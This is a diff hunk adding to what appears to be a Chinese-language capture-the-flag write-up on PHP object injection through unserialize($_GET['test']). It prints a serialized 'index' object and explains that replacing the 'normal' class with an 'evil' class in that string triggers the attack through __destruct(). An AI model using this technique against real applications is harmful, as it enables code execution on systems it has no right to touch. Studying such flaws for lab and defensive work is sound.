@@ -39,3 +39,17 @@ unserialize($_GET['test']);
 
 对于最后的接收参数test，并且反序列化，一定会执行destruct()
 因此只需要调整test的参数即可
+
+```php
+$temp = new index();
+
+var_dump(serialize($temp));
+```
+先得到原本的对象序列化后的结果
+```php
+string(52) "O:5:"index":1:{s:11:"\000index\000test";O:6:"normal":0:{}}"
+
+please attack me
+```
+
+对test赋值的时候将normal类更改到对应的evil类
